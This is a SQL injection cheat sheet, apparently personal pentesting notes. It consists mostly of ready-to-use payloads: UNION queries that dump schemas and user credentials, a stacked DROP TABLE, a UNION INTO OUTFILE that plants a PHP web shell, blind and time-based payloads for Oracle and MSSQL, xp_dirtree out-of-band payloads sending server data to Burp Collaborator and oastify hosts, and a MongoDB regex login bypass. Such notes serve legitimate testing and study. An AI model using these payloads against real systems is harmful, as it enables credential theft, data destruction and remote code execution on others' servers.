# SQL Injection

[HOME](../index.html) / [Web](./)

## The basics

How an example of unsecure sql statement looks like:

```
$SQL = "SELECT * FROM {tablename} WHERE {username} = ' + $_POST["username"] + ' AND ' + $_POST['password']'";
```

To break the statement:

```
$SQL = "SELECT * FROM {tablename} WHERE {username} = ' + 1' OR 1+1-- + ' AND ' + $_POST['password']'";
```

Order by:

```
=1 order by 1
=1 order by 2
=1 order by 3
.
.
.
Until error occurs, then:
=1 union all select 1, 2, 3...
=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
=1 union all select 1, username, password from users

' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -    # db name
' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = '[DB_NAME]'-- -   # table name
' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = '[TABLE_NAME]'-- -   # column name
' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -   # column content
```

### Simple SQL injection test

```
'
1' OR 1+1--
\'
```

### Stacked injection; Where table name is known

```
1'; DROP TABLE {tablename} --
```

### Where column name is known

```
1'; ALTER TABLE {tablename} ALTER COLUMN {columnname} {datatype} --
1' UNION SELECT {columnname} FROM {tablename};--
1' UNION ALL SELECT {columnname} FROM {tablename};--
```

## Blind injection

Apply in URL

```
www.example.com/xxx.php?id=1 or 1=1
```

## RCE with UNION

```
123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
```

## Oracle DB

```
' UNION SELECT table_name,null,null FROM all_tables--
' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
' UNION SELECT [col1],[col2],null FROM [table]--
' AND (SELECT COUNT(global_name) FROM global_name)=19 AND 'AdhT'='AdhT    # number of rows
' AND (SELECT LENGTH(global_name) FROM global_name)=8 AND 'AdhT'='AdhT    # word count
' AND SUBSTRC((SELECT global_name FROM global_name),1,1)=65 AND 'AdhT'='AdhT    # Ascii decode
```

## Microsoft SQL Server

```
--------------------Union-Based----------------------
' OR LEN(CURRENT_USER)='3
' OR SUBSTRING(CURRENT_USER,1,3)='DBO
' OR LEN(db_name())=13;--
' OR SUBSTRING(db_name(),1,5)='xxxxx';--

--------------------Error-Based----------------------
'*cast((SELECT @@version) as int)*'        
' and 1=convert(int,@@version)-- -
' and 1=convert(int,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'))-- -
' and 1=convert(int,(select top 1 table_name from information_schema.tables))--
' and 1=convert(int,(select top 1 name from sys.databases))--
' and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('xxxxx')))--
' and 1=convert(int,(select top 1 name from sys.databases where name not in ('master','tempdb')))--

---------------------Time-Based---------------------
' if(len(current_user)=3 waitfor delay'0:0:20'--
'IF CURRENT_USER='dbo' WAITFOR DELAY '00:00:15'--
'IF((SELECT count(db_name()))=1) WAITFOR DELAY '00:00:5'--
'IF((SELECT count(database_id) from sys.databases)=1) WAITFOR DELAY '00:00:5'--
'IF((SELECT count(database_id) from sys.databases)=1) WAITFOR DELAY '00:00:5'--

---------------------OOB---------------------
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@servername,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@version,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(DB_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(USER_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
');declare @q varchar(200);set @q='\\fj2meelkqbazaz61dntl0yzycpih69uy.'+(SELECT SUBSTRING(@@version,1,9))+'.oasti'+'fy.com\huh'; exec master.dbo.xp_dirtree @q;--
```

## NodeJS / MongoDB

```
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 43
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user":"admin","password":{"$regex":"^A"}}    # bruteforce password start with A
```
